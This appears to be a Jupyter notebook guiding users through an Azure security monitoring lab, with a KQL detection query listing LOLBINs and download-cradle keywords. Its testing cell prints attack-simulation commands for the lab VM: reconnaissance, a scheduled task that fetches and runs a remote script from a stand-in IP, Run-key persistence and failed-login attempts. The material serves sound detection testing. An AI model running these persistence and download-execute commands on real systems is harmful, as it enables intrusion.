{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "gs-intro-md",
   "metadata": {},
   "source": [
    "# Azure Security Monitoring Lab - Getting Started\n",
    "\n",
    "This notebook provides an overview of the deployed Azure Security Monitoring & Analytics Lab environment and guides you through initial exploration.\n",
    "\n",
    "The lab is designed to showcase a modern, scalable architecture for collecting, processing, analyzing, and responding to security telemetry in Azure, utilizing key services like Azure Monitor Agent, Event Hubs, Stream Analytics, Log Analytics, Sentinel, Data Lake Storage, and Synapse Analytics."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "gs-lab-architecture-ref",
   "metadata": {},
   "source": [
    "## Lab Architecture\n",
    "\n",
    "The high-level architecture involves multiple components working together for different data flows. Refer to the detailed diagram in the project root:\n",
    "\n",
    "<img src=\"architecture_diagram.png\" alt=\"Lab Architecture Diagram\" width=\"150%\" height=\"150%\"/>\n",
    "\n",
    "\n",
    "**Key Principles:**\n",
    "*   **Azure Monitor Agent (AMA):** Primary collector for VM telemetry (OS logs, security events, performance, Sysmon) sent directly to Log Analytics.\n",
    "*   **Event Hubs:** Serves as a scalable ingestion point for high-volume logs (e.g., from PaaS diagnostic settings or potentially other forwarders) before they undergo real-time processing.\n",
    "*   **Stream Analytics:** Provides real-time filtering, enrichment, and detection on the Event Hubs stream, routing data appropriately (e.g., alerts to Log Analytics, raw data to ADLS).\n",
    "*   **Log Analytics & Sentinel:** Core SIEM for storing curated logs (from AMA & ASA), running KQL-based detections, investigations, and hunting.\n",
    "*   **ADLS Gen2 & Synapse:** Enables cost-\n",
    "effective long-term storage and powerful batch analytics/ML capabilities."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "gs-prereqs-md",
   "metadata": {},
   "source": [
    "## Prerequisites\n",
    "\n",
    "Before starting this lab, ensure you have:\n",
    "\n",
    "1. **Azure Subscription:** An active Azure subscription with sufficient permissions (Contributor or Owner recommended).\n",
    "2. **Local Environment:**\n",
    "   - Azure CLI installed and logged in (`az login`).\n",
    "   - PowerShell 5.1+.\n",
    "   - Git.\n",
    "   - Python 3.8+ with packages for *this notebook's ML section*: `numpy`, `pandas`, `scikit-learn`, `matplotlib` (`pip install numpy pandas scikit-learn matplotlib`).\n",
    "3. **Lab Deployed:** You should have successfully run the `Deploy.ps1` script from your local terminal."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "gs-components-md",
   "metadata": {},
   "source": [
    "## Deployed Components Overview\n",
    "\n",
    "The `Deploy.ps1` script created the following core components (refer to `architecture_diagram.md` for relationships):\n",
    "\n",
    "1.  **Resources (Core Infrastructure):**\n",
    "    *   **Virtual Machine:** Windows Server VM generating logs.\n",
    "    *   **Networking:** VNet, Subnet, NSG (allowing RDP from your specified IP).\n",
    "    *   **Event Hubs Namespace & Hub:** For high-volume ingestion path.\n",
    "    *   **Log Analytics Workspace:** Central store for AMA logs and filtered ASA output.\n",
    "    *   **Azure Sentinel Instance:** SIEM layer on Log Analytics.\n",
    "    *   **Azure Stream Analytics Job:** For real-time processing (requires manual configuration/start).\n",
    "    *   **Azure Data Lake Storage (Gen2):** Storage account for ASA output / Synapse data.\n",
    "    *   **Azure Synapse Workspace:** For batch analytics (includes Spark pool).\n",
    "    *   **Key Vault:** Stores secrets (like VM password).\n",
    "    *   **Managed Identity:** For secure service communication.\n",
    "\n",
    "2.  **Collection & Configuration:**\n",
    "    *   **Azure Monitor Agent (AMA):** Automatically installed on the VM.\n",
    "    *   **Data Collection Rules (DCR):** Deployed via Bicep to configure AMA (Security Events, Perf, Sysmon, File/Registry changes)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "gs-prereq-check-code",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Python Version being used by this notebook kernel: 3.12.2 (tags/v3.12.2:6abddd9, Feb  6 2024, 21:26:36) [MSC v.1937 64 bit (AMD64)]\n",
      "Azure CLI executable found at: C:\\Program Files\\Microsoft SDKs\\Azure\\CLI2\\wbin\\az.CMD\n"
     ]
    }
   ],
   "source": [
    "# Verify Python Version & Azure CLI accessibility in terminal\n",
    "# You should have already run 'az login' in your *terminal* before deploying.\n",
    "\n",
    "import sys\n",
    "import shutil\n",
    "\n",
    "print(f\"Python Version being used by this notebook kernel: {sys.version}\")\n",
    "\n",
    "# Check if Azure CLI command exists in PATH \n",
    "az_path = shutil.which('az')\n",
    "if az_path:\n",
    "    print(f\"Azure CLI executable found at: {az_path}\")\n",
    "else:\n",
    "    print(\"ERROR: Azure CLI command ('az') not found.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "gs-deploy-md",
   "metadata": {},
   "source": [
    "## Step 1: Deploy Azure Infrastructure (via PowerShell/Terminal)\n",
    "\n",
    "*(This step should already be completed before running this notebook)*\n",
    "\n",
    "The lab infrastructure is defined using Azure Bicep and deployed using the `Deploy.ps1` PowerShell script from your local terminal.\n",
    "\n",
    "**Example Deployment Command Used:**\n",
    "```powershell\n",
    ".\\Deploy.ps1 -IpAddress \"YOUR_PUBLIC_IP\"\n",
    "```\n",
    "\n",
    "The script handles resource group creation/checking and deploys all components shown in the architecture diagram."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "gs-post-deploy-verify-md",
   "metadata": {},
   "source": [
    "## Step 2: Post-Deployment Verification (Azure Portal & Log Analytics)\n",
    "\n",
    "After the deployment script finishes successfully (allow 15-30 mins), the Azure Monitor Agent (AMA) on the VM automatically starts collecting logs based on the deployed Data Collection Rules.\n",
    "\n",
    "**Verify Data Collection in Log Analytics:**\n",
    "\n",
    "1.  Navigate to the **Log Analytics Workspace** created by the deployment (name based on your prefix) in the Azure Portal.\n",
    "2.  Go to the **Logs** blade.\n",
    "3.  Wait 5-10 minutes for initial data ingestion.\n",
    "4.  Run queries to check for incoming data. Examples:\n",
    "\n",
    "    *   **Security Events:** `SecurityEvent | count` or `SecurityEvent | take 10`\n",
    "    *   **Performance Data:** `Perf | where CounterName == \"% Processor Time\" and InstanceName == \"_Total\" | take 10`\n",
    "    *   **Sysmon Events (if enabled):** `Event | where Source == \"Microsoft-Windows-Sysmon\" | take 10` (Note: Sysmon events might go to the generic `Event` table depending on DCR configuration).\n",
    "\n",
    "If you don't see data, check the VM's AMA extension status in the Azure Portal under the VM's 'Extensions + applications' blade and review the Data Collection Rules associated with the VM."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "gs-explore-la-sentinel-md",
   "metadata": {},
   "source": [
    "## Step 3a: Explore Data & Detections (Log Analytics / Sentinel with KQL)\n",
    "\n",
    "With AMA sending data to Log Analytics, you can use KQL for exploration, hunting, and creating detection rules in Sentinel.\n",
    "\n",
    "1.  **Explore Log Analytics:** Use the **Logs** blade in the workspace to run KQL queries against tables like `SecurityEvent`, `Perf`, `Event` (for Sysmon/other logs), etc.\n",
    "2.  **Configure Sentinel:** Navigate to the **Microsoft Sentinel** instance linked to the workspace.\n",
    "    *   **Data Connectors:** Verify the 'Windows Security Events via AMA' connector shows as connected and collecting data.\n",
    "    *   **Analytics:** Explore built-in templates or create custom scheduled query rules using KQL to detect threats based on the collected logs.\n",
    "    *   **Workbooks:** Use workbooks for visualizing security data.\n",
    "    *   **Hunting:** Proactively hunt for threats using KQL queries."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "gs-kql-code",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Example KQL query for detecting suspicious processes (run in Log Analytics or Sentinel):\n",
      "// Detect suspicious process creations involving common LOLBINs and keywords\n",
      "// Source: SecurityEvent (EventID 4688)\n",
      "let lolbins = dynamic([\"powershell.exe\", \"cmd.exe\", \"wmic.exe\", \"regsvr32.exe\", \"rundll32.exe\", \"mshta.exe\", \"certutil.exe\", \"bitsadmin.exe\"]);\n",
      "let suspiciousKeywords = dynamic([\"base64\", \"hidden\", \"downloadstring\", \"bypass\", \"-enc\", \"webclient\", \"invoke-expression\", \"iex\", \"schtasks\", \"-w hidden\", \"-nop\", \"-noni\"]);\n",
      "SecurityEvent\n",
      "| where EventID == 4688 // Process Creation\n",
      "| parse kind=relaxed CommandLine with * \"-enc\" encodedCommand // Simple parse for encoded commands\n",
      "| extend Proc = tostring(NewProcessName),\n",
      "         ParentProc = tostring(ParentProcessName),\n",
      "         Cmd = tostring(CommandLine)\n",
      "| where (Proc has_any (lolbins) and Cmd has_any (suspiciousKeywords))\n",
      "        or (isnotempty(encodedCommand))\n",
      "        or (Proc has \"schtasks.exe\" and Cmd has_any(\"powershell\", \"cmd.exe\", \"http:\", \"https:\")) // Task creation with download/execution\n",
      "| project TimeGenerated, Computer, SubjectUserName, ParentProc, Proc, Cmd, encodedCommand\n",
      "| sort by TimeGenerated desc\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# Example KQL query for suspicious process creation (Run in Log Analytics/Sentinel Analytics Rule)\n",
    "# This query searches the SecurityEvent table (EventID 4688) for suspicious patterns.\n",
    "\n",
    "example_kql = '''\\\n",
    "// Detect suspicious process creations involving common LOLBINs and keywords\n",
    "// Source: SecurityEvent (EventID 4688)\n",
    "let lolbins = dynamic([\"powershell.exe\", \"cmd.exe\", \"wmic.exe\", \"regsvr32.exe\", \"rundll32.exe\", \"mshta.exe\", \"certutil.exe\", \"bitsadmin.exe\"]);\n",
    "let suspiciousKeywords = dynamic([\"base64\", \"hidden\", \"downloadstring\", \"bypass\", \"-enc\", \"webclient\", \"invoke-expression\", \"iex\", \"schtasks\", \"-w hidden\", \"-nop\", \"-noni\"]);\n",
    "SecurityEvent\n",
    "| where EventID == 4688 // Process Creation\n",
    "| parse kind=relaxed CommandLine with * \"-enc\" encodedCommand // Simple parse for encoded commands\n",
    "| extend Proc = tostring(NewProcessName),\n",
    "         ParentProc = tostring(ParentProcessName),\n",
    "         Cmd = tostring(CommandLine)\n",
    "| where (Proc has_any (lolbins) and Cmd has_any (suspiciousKeywords))\n",
    "        or (isnotempty(encodedCommand))\n",
    "        or (Proc has \"schtasks.exe\" and Cmd has_any(\"powershell\", \"cmd.exe\", \"http:\", \"https:\")) // Task creation with download/execution\n",
    "| project TimeGenerated, Computer, SubjectUserName, ParentProc, Proc, Cmd, encodedCommand\n",
    "| sort by TimeGenerated desc\n",
    "'''\n",
    "\n",
    "print(\"Example KQL query for detecting suspicious processes (run in Log Analytics or Sentinel):\")\n",
    "print(example_kql)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "gs-configure-asa-md",
   "metadata": {},
   "source": [
    "## Step 3b: Configure Real-Time Filtering/Detections (Azure Stream Analytics)\n",
    "\n",
    "This is an **optional** step if you plan to use the Event Hubs path (e.g., by configuring Diagnostic Settings on PaaS resources to send to Event Hubs). The ASA job is deployed but **not started** and requires configuration.\n",
    "\n",
    "**Purpose:** Use ASA to process high-volume streams from Event Hubs *before* they hit Log Analytics or long-term storage. Useful for:\n",
    "*   Filtering out noisy or low-value events to save Log Analytics ingestion costs.\n",
    "*   Enriching events with contextual data in real-time.\n",
    "*   Performing simple, low-latency detections directly on the stream.\n",
    "*   Routing different types of events to different destinations (e.g., alerts to LA, raw to ADLS).\n",
    "\n",
    "**Configuration Steps (Azure Portal):**\n",
    "\n",
    "1.  **Navigate to the ASA Job:** Find the deployed Stream Analytics job.\n",
    "2.  **Configure Inputs:** Add an 'Event Hub' input, pointing to the deployed Event Hubs namespace and hub (e.g., `endpoint-logs`). Give it an alias (e.g., `rawStreamInput`). Use Managed Identity for authentication.\n",
    "3.  **Configure Outputs:** Add outputs as needed:\n",
    "    *   **Log Analytics:** To send filtered/alerted events to a custom table in the workspace.\n",
    "    *   **Blob Storage / ADLS Gen2:** To archive raw or processed data.\n",
    "    *   **Another Event Hub:** To chain processing.\n",
    "    *   Give outputs aliases (e.g., `filteredToLA`, `archiveToADLS`).\n",
    "4.  **Write the Query:** Use ASA's SQL-like query language. Read from the input alias, apply `WHERE` clauses for filtering or `SELECT` transformations, and send results `INTO` your output aliases.\n",
    "5.  **Start the Job:** Once configured, start the ASA job."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "gs-asa-code",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Example Azure Stream Analytics Query (Configure in Azure Portal):\n",
      "\n",
      "-- Input Alias: rawStreamInput\n",
      "-- Output Alias 1: filteredToLA (Log Analytics)\n",
      "-- Output Alias 2: archiveToADLS (ADLS Gen2)\n",
      "\n",
      "WITH ParsedEvents AS (\n",
      "    SELECT \n",
      "        System.Timestamp AS EventTime, \n",
      "        GetRecordPropertyValue(EventData, 'Level') AS LogLevel, \n",
      "        GetRecordPropertyValue(EventData, 'Computer') AS ComputerName,\n",
      "        GetRecordPropertyValue(EventData, 'ProviderName') AS ProviderName,\n",
      "        GetRecordPropertyValue(EventData, 'EventID') AS EventID,\n",
      "        EventData -- Keep the original record\n",
      "    FROM \n",
      "        rawStreamInput -- Read from Event Hub input\n",
      ")\n",
      "\n",
      "-- Send only Warning (3) and Error (2) level events to Log Analytics\n",
      "SELECT EventTime, LogLevel, ComputerName, ProviderName, EventID, EventData\n",
      "INTO filteredToLA\n",
      "FROM ParsedEvents\n",
      "WHERE LogLevel <= 3 \n",
      "\n",
      "-- Send ALL events to ADLS for archival\n",
      "SELECT *\n",
      "INTO archiveToADLS\n",
      "FROM ParsedEvents\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# Example Azure Stream Analytics query (Write this in the ASA Job Query Editor in Azure portal)\n",
    "# This example assumes logs coming into Event Hub follow a structure with 'Level' and 'EventID'.\n",
    "\n",
    "example_asa_query = '''\n",
    "-- Input Alias: rawStreamInput\n",
    "-- Output Alias 1: filteredToLA (Log Analytics)\n",
    "-- Output Alias 2: archiveToADLS (ADLS Gen2)\n",
    "\n",
    "WITH ParsedEvents AS (\n",
    "    SELECT \n",
    "        System.Timestamp AS EventTime, \n",
    "        GetRecordPropertyValue(EventData, 'Level') AS LogLevel, \n",
    "        GetRecordPropertyValue(EventData, 'Computer') AS ComputerName,\n",
    "        GetRecordPropertyValue(EventData, 'ProviderName') AS ProviderName,\n",
    "        GetRecordPropertyValue(EventData, 'EventID') AS EventID,\n",
    "        EventData -- Keep the original record\n",
    "    FROM \n",
    "        rawStreamInput -- Read from Event Hub input\n",
    ")\n",
    "\n",
    "-- Send only Warning (3) and Error (2) level events to Log Analytics\n",
    "SELECT EventTime, LogLevel, ComputerName, ProviderName, EventID, EventData\n",
    "INTO filteredToLA\n",
    "FROM ParsedEvents\n",
    "WHERE LogLevel <= 3 \n",
    "\n",
    "-- Send ALL events to ADLS for archival\n",
    "SELECT *\n",
    "INTO archiveToADLS\n",
    "FROM ParsedEvents\n",
    "'''\n",
    "\n",
    "print(\"Example Azure Stream Analytics Query (Configure in Azure Portal):\")\n",
    "print(example_asa_query)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "gs-ml-md",
   "metadata": {},
   "source": [
    "## Step 4: Batch Analytics & Anomaly Detection (Azure Synapse / ML Example)\n",
    "\n",
    "This lab includes Azure Synapse Analytics for advanced batch processing, data warehousing, and ML tasks on large volumes of security data, typically sourced from ADLS Gen2.\n",
    "\n",
    "**Example Use Cases:**\n",
    "*   Training ML models (like the Isolation Forest below) on larger historical datasets stored in ADLS.\n",
    "*   Performing complex ETL (Extract, Transform, Load) on logs.\n",
    "*   Joining security data with threat intelligence feeds or asset inventories.\n",
    "*   Running scheduled Spark jobs for periodic baseline analysis or anomaly detection.\n",
    "\n",
    "This section demonstrates a *basic* ML anomaly detection example using **mock data** within this notebook. For real-world use, you would typically run such analysis within the Synapse environment using Spark notebooks against data in the linked ADLS account.\n",
    "\n",
    "**Note:** Ensure you have `scikit-learn`, `pandas`, `numpy`, and `matplotlib` installed (`pip install scikit-learn pandas numpy matplotlib`)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "gs-ml-code",
   "metadata": {},
   "outputs": [
    {
     "ename": "ModuleNotFoundError",
     "evalue": "No module named 'numpy'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[8], line 4\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[38;5;66;03m# Example code for a simple anomaly detection model using Python (runnable in this notebook)\u001b[39;00m\n\u001b[0;32m      2\u001b[0m \u001b[38;5;66;03m# In a real scenario, adapt this logic for a Synapse Spark notebook reading from ADLS.\u001b[39;00m\n\u001b[1;32m----> 4\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m \u001b[38;5;21;01mnumpy\u001b[39;00m \u001b[38;5;28;01mas\u001b[39;00m \u001b[38;5;21;01mnp\u001b[39;00m\n\u001b[0;32m      5\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m \u001b[38;5;21;01mpandas\u001b[39;00m \u001b[38;5;28;01mas\u001b[39;00m \u001b[38;5;21;01mpd\u001b[39;00m\n\u001b[0;32m      6\u001b[0m \u001b[38;5;28;01mfrom\u001b[39;00m \u001b[38;5;21;01msklearn\u001b[39;00m\u001b[38;5;21;01m.\u001b[39;00m\u001b[38;5;21;01mensemble\u001b[39;00m \u001b[38;5;28;01mimport\u001b[39;00m IsolationForest\n",
      "\u001b[1;31mModuleNotFoundError\u001b[0m: No module named 'numpy'"
     ]
    }
   ],
   "source": [
    "# Example code for a simple anomaly detection model using Python (runnable in this notebook)\n",
    "# In a real scenario, adapt this logic for a Synapse Spark notebook reading from ADLS.\n",
    "\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "from sklearn.ensemble import IsolationForest\n",
    "import matplotlib.pyplot as plt\n",
    "import warnings\n",
    "warnings.filterwarnings(\"ignore\", category=UserWarning) # Suppress potential UserWarnings from plot libs\n",
    "\n",
    "def load_mock_login_data(num_normal=190, num_anomaly=10):\n",
    "    \"\"\"Generate mock login data for demonstration\"\"\"\n",
    "    np.random.seed(42)\n",
    "    normal_hours = np.random.randint(8, 18, num_normal)\n",
    "    normal_days = np.random.randint(0, 5, num_normal)\n",
    "    anomaly_hours = np.random.choice([np.random.randint(0, 8), np.random.randint(18, 24)], num_anomaly)\n",
    "    anomaly_days = np.random.randint(5, 7, num_anomaly)\n",
    "    hours = np.concatenate([normal_hours, anomaly_hours])\n",
    "    days = np.concatenate([normal_days, anomaly_days])\n",
    "    df = pd.DataFrame({'login_hour': hours, 'day_of_week': days})\n",
    "    return df\n",
    "\n",
    "# Load mock data\n",
    "mock_data = load_mock_login_data()\n",
    "X = mock_data[['login_hour', 'day_of_week']]\n",
    "\n",
    "# Train Isolation Forest\n",
    "model = IsolationForest(n_estimators=100, contamination='auto', random_state=42)\n",
    "model.fit(X)\n",
    "\n",
    "# Predict anomalies (-1 for anomalies, 1 for normal)\n",
    "mock_data['predicted_anomaly'] = model.predict(X)\n",
    "\n",
    "# Visualize\n",
    "plt.figure(figsize=(10, 6))\n",
    "normal = mock_data[mock_data['predicted_anomaly'] == 1]\n",
    "anomaly = mock_data[mock_data['predicted_anomaly'] == -1]\n",
    "plt.scatter(normal['login_hour'], normal['day_of_week'], c='blue', label='Normal', alpha=0.6)\n",
    "plt.scatter(anomaly['login_hour'], anomaly['day_of_week'], c='red', label='Anomaly', marker='x', s=100)\n",
    "xx, yy = np.meshgrid(np.linspace(X['login_hour'].min()-1, X['login_hour'].max()+1, 50), np.linspace(X['day_of_week'].min()-1, X['day_of_week'].max()+1, 50))\n",
    "Z = model.decision_function(np.c_[xx.ravel(), yy.ravel()])\n",
    "Z = Z.reshape(xx.shape)\n",
    "plt.contour(xx, yy, Z, levels=[0], linewidths=2, colors='black')\n",
    "plt.contourf(xx, yy, Z, cmap=plt.cm.Blues_r, alpha=0.3)\n",
    "plt.title('Anomaly Detection using Isolation Forest (Mock Login Data)')\n",
    "plt.xlabel('Login Hour of Day')\n",
    "plt.ylabel('Day of Week (0=Mon, 6=Sun)')\n",
    "plt.legend()\n",
    "plt.grid(True)\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "gs-testing-md",
   "metadata": {},
   "source": [
    "## Step 5: Testing Detections (Generate Events on VM)\n",
    "\n",
    "To test your detection rules (KQL in Sentinel, or ASA queries), you need events generated on the deployed VM. Run the following commands in a **PowerShell prompt on the VM** (connect via RDP using its Public IP) to simulate potentially suspicious activities. These events should be collected by AMA and appear in Log Analytics.\n",
    "\n",
    "**Important:** Only run these on the lab VM."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "gs-testing-code",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Example commands to run on the deployed Windows VM to generate test events\n",
    "\n",
    "test_commands = '''\n",
    "echo \"--- Simulating Potentially Malicious Activity ---\"\n",
    "\n",
    "# --- Mimic Reconnaissance ---\n",
    "echo \"Running basic system info commands...\"\n",
    "whoami ; ipconfig /all ; systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" ; net user ; net localgroup administrators\n",
    "echo \"Enumerating running processes...\"\n",
    "tasklist\n",
    "echo \"Checking network connections...\"\n",
    "netstat -ano\n",
    "\n",
    "# --- Mimic Execution / LOLBINs ---\n",
    "echo \"Running PowerShell encoded command...\"\n",
    "$cmd = 'Write-Host \"PS Encoded Test\"' ; $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd) ; $encoded = [Convert]::ToBase64String($bytes) ; powershell.exe -Enc $encoded\n",
    "echo \"Using certutil to download (harmless example)...\"\n",
    "certutil -urlcache -split -f https://raw.githubusercontent.com/PowerShell/PowerShell/master/LICENSE.txt C:\\Windows\\Temp\\pstest.txt\n",
    "echo \"Running wmic process call create...\"\n",
    "wmic process call create \"notepad.exe\"\n",
    "\n",
    "# --- Mimic Persistence ---\n",
    "echo \"Creating suspicious scheduled task (will likely fail)...\" ; schtasks /create /tn \"MalwareUpdate\" /tr \"powershell.exe -nop -w hidden -c 'iex ((new-object net.webclient).downloadstring(''http://1.2.3.4/update.ps1''))'\" /sc DAILY /st 03:00 /F /RL HIGHEST\n",
    "echo \"Adding Run key persistence (requires admin prompt)...\" ; reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MalwareUpdater\" /t REG_SZ /d \"C:\\Windows\\Temp\\updater.exe\" /f\n",
    "\n",
    "# --- Mimic Credential Access ---\n",
    "echo \"Attempting failed logins...\" ; for /L %i in (1,1,5) do @net use \\\\\\\\localhost\\C$ /user:fakeuser wrongpassword\n",
    "echo \"Querying sensitive registry key (LSA - requires monitoring)...\" ; reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\"\n",
    "'''\n",
    "\n",
    "print(\"Example commands to generate security events for testing (COPY AND RUN ON THE DEPLOYED VM):\")\n",
    "print(test_commands)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "gs-cleanup-md",
   "metadata": {},
   "source": [
    "## Step 6: Clean-up Resources\n",
    "\n",
    "When you are finished with the lab, **ensure you delete the deployed resources** to avoid incurring unnecessary Azure costs. Use the Azure CLI command below in your **local terminal** where you are logged in to Azure.\n",
    "\n",
    "**Warning:** This command permanently deletes the entire resource group and all resources created within it."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "gs-cleanup-code",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Command to clean up resources (Run in local PowerShell/terminal)\n",
    "\n",
    "# IMPORTANT: Replace 'MalwareLab' if your final resource group name was different \n",
    "# (e.g., due to the timestamp logic if the original group wasn't empty)\n",
    "# Check the deployment output or Azure portal for the exact resource group name.\n",
    "resource_group_name = \"MalwareLab\" # <-- VERIFY THIS NAME\n",
    "\n",
    "print(f\"\\nResource cleanup command (RUN IN LOCAL PowerShell/TERMINAL):\")\n",
    "print(\"#-----------------------------------------------------\")\n",
    "print(f\"# WARNING: This will permanently delete '{resource_group_name}'\")\n",
    "print(f\"az group delete --name {resource_group_name} --yes --no-wait\") \n",
    "print(\"#-----------------------------------------------------\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "gs-conclusion-md",
   "metadata": {},
   "source": [
    "## Conclusion\n",
    "\n",
    "This lab provides a platform to gain hands-on experience with a comprehensive Azure security monitoring architecture, including:\n",
    "\n",
    "- Infrastructure deployment and automation (Bicep, PowerShell scripting).\n",
    "- VM Telemetry collection via Azure Monitor Agent (AMA) and Data Collection Rules.\n",
    "- High-volume data ingestion and routing using Event Hubs.\n",
    "- Real-time filtering and detection with Stream Analytics.\n",
    "- SIEM capabilities with Log Analytics and Microsoft Sentinel (KQL-based analysis).\n",
    "- Long-term archival and batch processing using ADLS Gen2 and Azure Synapse Analytics.\n",
    "- Secure credential management (Key Vault, Managed Identities).\n",
    "\n",
    "Use the deployed environment to experiment with KQL queries, Sentinel rules, ASA queries, Synapse notebooks, and configuring diagnostic settings to understand how these services work together."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  },
  "nbformat": 4,
  "nbformat_minor": 5
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
